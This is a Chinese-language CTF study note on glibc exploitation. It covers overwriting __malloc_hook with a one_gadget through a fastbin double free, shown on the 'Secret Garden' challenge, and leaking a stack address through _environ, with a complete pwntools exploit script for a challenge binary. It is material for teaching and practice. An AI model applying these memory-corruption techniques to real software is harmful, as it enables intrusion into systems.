# About Hook & _environ

## Hook

\_\_malloc\_hook等是libc中的全局变量，在调用malloc、free、realloc等函数时，会首先判断对应的hook是否为空，如果不为空则跳转到hook。

当开启**RELRO:    Full RELRO**保护时，got表不可写，不能通过劫持got表改变函数调用，此时将hook改为one\_gadget通常能取得不错的效果

**For example :** 

Pwnable 的 Secret Garden中，开启了全保护。

可以利用unsortedbin泄露出libc基址之后，通过double free实现uaf，将fd指针修改到\_\_malloc\_hook附近，从而在下次进行分配时可以修改附近的值。

```
pwndbg> telescope 0x3c4b10+0x7f0575c43000-0x20
00:0000│   0x7f0576007af0 (_IO_wide_data_0+304) —▸ 0x7f0576006260 (_IO_wfile_jumps) ◂— 0x0
01:0008│   0x7f0576007af8 ◂— 0x0
02:0010│   0x7f0576007b00 (__memalign_hook) —▸ 0x7f0575cc8e20 (memalign_hook_ini) ◂— push   r12
03:0018│   0x7f0576007b08 (__realloc_hook) —▸ 0x7f0575cc8a00 (realloc_hook_ini) ◂— push   r15
04:0020│   0x7f0576007b10 (__malloc_hook) ◂— 0x0
```

从fastbin中进行分配时，不会检查堆块的对齐，且使用unsigned int进行比较，所以前4字节不重要，只要存在形如0x\*\*\*\*\*\*\*\*000000xx结构的数据即可进行分配，其中0x**xx**在fastbin大小中即可。显然可以利用*_IO_wide_data_0+304*的X7f与下一Qword的0作为size，绕过检查(需要开malloc(0x60))，将malloc\_hook改为可用的one\_gadget即可。

*Additional：* 通过malloc调用时通常不能满足寄存器要求，可以通过连续两次free相同的chunk，触发malloc_printerr，可以满足寄存器要求。

## \_environ

\_environ 是libc中存储栈地址的全局变量，leak出libc基址之后可以通过打印*libc.sym['_environ']*地址的变量得到当前程序运行的栈地址，从而进行后续操作。

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.binary = "./guess"
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]


io = process("./guess",env = {"PRE_LOAD": "./libc.so.6"})
# io = remote("106.75.90.160", 9999)
# gdb.attach(io,'b * 0x400b17')
raw_input('->debug ')
elf = ELF("./guess")
libc = ELF("./libc.so.6")

io.sendline('a' * 0x128 + p64(elf.got['__libc_start_main']))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['__libc_start_main']
info("libc: {:#x}".format(libc.address))


#  gdb.attach(io, "b *0x400B23\nc")
#  pause()
io.sendline('a' * 0x128 + p64(libc.sym['_environ']))
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
info("stack: {:#x}".format(stack))

io.sendline('a' * 0x128 + p64(stack - 0x168))

io.interactive()
```



## 